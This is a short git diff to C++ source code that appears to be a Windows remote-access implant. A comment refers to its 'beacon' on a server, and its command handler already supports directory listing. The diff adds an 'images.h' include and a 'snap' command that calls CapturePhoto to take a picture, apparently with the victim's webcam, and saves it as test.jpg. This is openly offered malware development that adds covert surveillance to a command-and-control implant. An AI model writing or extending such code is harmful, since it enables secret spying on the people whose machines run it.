@@ -13,6 +13,7 @@
 #include <json/json.h>  // Include jsoncpp header
 
 #include "directory_traversal.h"
+#include "images.h"
 
 
 #pragma comment(lib, "iphlpapi.lib")
@@ -176,6 +177,9 @@ std::string command_handler(const std::string& command, const std::string& comma
     } else if (command == "list_dir") { // need to check if it starts with shell, limitation of current beacon on server
         std::string output = listDirectory(command_data.c_str());
         return output;
+    } else if (command == "snap") {
+        CapturePhoto(L"test.jpg");
+        return "Picture taken";
     } else {
         std::cerr << "Unknown command: " << command << std::endl;
     }
